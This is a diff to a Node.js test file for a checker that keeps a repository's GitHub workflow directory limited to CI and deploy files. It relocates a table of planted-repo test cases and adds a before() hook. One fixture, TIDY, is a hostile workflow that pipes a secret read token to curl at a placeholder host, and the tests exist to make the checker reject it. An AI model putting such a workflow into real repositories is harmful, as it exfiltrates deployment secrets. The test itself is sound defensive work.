@@ -3,7 +3,7 @@ import { execFileSync } from 'node:child_process';
 import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, unlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
-import { after, describe, it } from 'node:test';
+import { after, before, describe, it } from 'node:test';
 import { fileURLToPath } from 'node:url';
 import {
     ACTIONS,
@@ -485,7 +485,11 @@ describe('the-deploy-workflow-keeps-its-keys-apart', () => {
 });
 
 describe('the-workflow-runs-the-scripts-it-was-tested-with', () => {
-    const { tree, problems } = parseWorkflow(TEXT);
+    let tree;
+    let problems;
+    before(() => {
+        ({ tree, problems } = parseWorkflow(TEXT));
+    });
 
     it('parses under the closed grammar', () => {
         assert.deepEqual(problems, []);
@@ -604,6 +608,15 @@ const WORKFLOWS = { '.github/workflows/ci.yml': CI_TEXT, '.github/workflows/depl
 /** The 8c3 critic's third workflow file: on a push to main, the looks Environment, its read token handed to curl. */
 const TIDY = `name: tidy\non:\n  push:\n    branches:\n      - main\njobs:\n  tidy:\n    runs-on: ubuntu-latest\n    environment: looks\n    steps:\n      - env:\n          T: ${ex('secrets.LOOKS_READ_TOKEN')}\n        run: curl -sd "$T" https://example.invalid\n`;
 
+const PLANTS_DIR = [
+    ['the 8c3 critic’s tidy.yml, tracked and on the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, {}],
+    ['tidy.yml on the disk, not tracked', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { tracked: Object.keys(WORKFLOWS) }],
+    ['tidy.yml tracked, gone from the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { gone: ['.github/workflows/tidy.yml'] }],
+    ['a .yaml file beside them', { ...WORKFLOWS, '.github/workflows/tidy.yaml': TIDY }, {}],
+    ['a file in a subdirectory', { ...WORKFLOWS, '.github/workflows/more/tidy.yml': TIDY }, {}],
+    ['ci.yml gone', { '.github/workflows/deploy.yml': TEXT }, {}],
+];
+
 /*
  * The 8c3 critic's item 2: an Environment's branch rule admits every
  * workflow file whose run is on `main`, whatever its trigger, so a third
@@ -621,14 +634,6 @@ describe('the-workflow-directory-holds-ci-and-deploy-alone', () => {
         assert.deepEqual(workflowFilesProblems(workflowFilesAt(plantRepo(WORKFLOWS))), [], 'the positive control: the two files alone, planted');
     });
 
-    const PLANTS_DIR = [
-        ['the 8c3 critic’s tidy.yml, tracked and on the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, {}],
-        ['tidy.yml on the disk, not tracked', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { tracked: Object.keys(WORKFLOWS) }],
-        ['tidy.yml tracked, gone from the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { gone: ['.github/workflows/tidy.yml'] }],
-        ['a .yaml file beside them', { ...WORKFLOWS, '.github/workflows/tidy.yaml': TIDY }, {}],
-        ['a file in a subdirectory', { ...WORKFLOWS, '.github/workflows/more/tidy.yml': TIDY }, {}],
-        ['ci.yml gone', { '.github/workflows/deploy.yml': TEXT }, {}],
-    ];
     for (const [name, files, how] of PLANTS_DIR) {
         it(`refuses ${name} (workflow-files)`, () => {
             const problems = workflowFilesProblems(workflowFilesAt(plantRepo(files, how)));
